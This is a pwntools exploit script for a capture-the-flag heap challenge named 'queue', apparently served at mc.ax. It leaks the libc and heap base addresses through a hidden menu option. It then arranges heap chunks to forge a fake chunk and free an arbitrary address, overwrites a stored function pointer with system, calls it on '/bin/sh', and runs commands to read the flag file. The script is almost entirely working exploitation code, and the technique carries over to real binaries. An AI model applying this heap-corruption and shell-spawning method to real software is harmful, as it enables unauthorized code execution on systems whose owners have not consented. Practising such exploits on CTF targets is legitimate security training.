from pwn import *
#context.log_level = 'debug'
context.arch = 'amd64'
context.terminal = ['tmux', 'split-window', '-h']

TARGET = './queue'
HOST = 'mc.ax'
PORT = 31283

elf = ELF(TARGET)
def start():
	if not args.R:
		print("local")
		#return process(TARGET, aslr=False)
		return process(TARGET, env={"LD_PRELOAD":"./libc.so.6"})
		# return process(TARGET, stdout=process.PTY, stdin=process.PTY)
	else:
		print("remote")
		return remote(HOST, PORT)

def get_base_address(proc):
	lines = open("/proc/{}/maps".format(proc.pid), 'r').readlines()
	for line in lines :
		if TARGET[2:] in line.split('/')[-1] :
			break
	return int(line.split('-')[0], 16)

def debug(proc, breakpoints):
	script = "handle SIGALRM ignore\n"
	PIE = get_base_address(proc)
	script += "set $base = 0x{:x}\n".format(PIE)
	for bp in breakpoints:
		script += "b *0x%x\n"%(PIE+bp)
	script += "c"
	gdb.attach(proc, gdbscript=script)

def dbg(val): print("\t-> %s: 0x%x" % (val, eval(val)))
def c(idx):
	r.sendlineafter('> ', '1')
	r.sendlineafter('? ', str(idx))

def f(idx):
	r.sendlineafter('> ', '2')
	r.sendlineafter('? ', str(idx))

def pu(idx, data):
	r.sendlineafter('> ', '3')
	if args.R:
		# bulk send ( for super short timeout )
		r.sendline(str(idx))
		r.sendline(str(data))
	else:
		r.sendlineafter('? ', str(idx))
		r.sendlineafter('? ', str(data))

def po(idx):
	r.sendlineafter('> ', '4')
	r.sendlineafter('? ', str(idx))
def comp(idx):
	r.sendlineafter('> ', '5')
	r.sendlineafter('? ', str(idx))

r = start()

def get_leak():
	c(0)
	r.sendlineafter('> ', '69')
	r.sendlineafter('? ', '0')
	r.recvuntil('data: ')
	leak = int(r.recvuntil('\n', True), 16)
	heap = leak - 0x2d0
	r.recvuntil('cmp: ')
	leak = int(r.recvuntil('\n', True), 16)
	base = leak - 0x183bd0
	system = base + 0x52290
	f(0)
	return base, heap,system

base, heap, system = get_leak()
dbg('base')
dbg('heap')

# size:0, cap:8
c(0)

# size:0, cap:0
comp(0)

# size:1, cap:0*2=0
pu(0, 'a')

# We need some fengsui to make slot0->data this layout
# heap + 0x330: 0x0000000000000000      0x0000000000000021
# heap + 0x340: 0x0000xxxxxxxxxxxx      0x0000xxxxxxxxxxxx <-- this is slot0->data with size=4
# heap + 0x350: 0x0000xxxxxxxxxxxx      0x0000xxxxxxxxxxxx <-- next push will overwrite slot1->data
# heap + 0x360: 0x0000yyyyyyyyyyyy      0x0000000000000001 <-- this is slot1 chunk with size=1
c(1)
pu(1, 'a')
pu(0, 'a')
pu(0, 'a')
pu(0, 'a')

# This will overwrite slot1->data[0] to (heap + 0x440) = slot2 + 0x10
pu(0, p64(heap+0x440))

# make slot2 this layout
# heap + 0x420: 0x0000000000000000      0x0000000000000031
# heap + 0x430: 0x0000xxxxxxxxxxxx      0x0000000000000021 <-- size = 0x21 (as fake chunk header)
# heap + 0x440: 0x0000000000000040      0x00007fxxxxxxxxxx <-- (slot1->data[0]) points here !
c(2)
for i in range(0x21):
	pu(2,'a')

if args.D:
	debug(r, [0x1452])

# free(slot1->data[0]) = free(heap + 0x440)
po(1)

# overwirte slot2->fptr to system
pu(0, 'a'*0x8+p64(system))

# trigger fptr("/bin/sh")
pu(2, '/bin/sh\x00')
r.sendline('pwd;cat flag.txt;cat /app/flag.txt;')

r.interactive()
r.close()
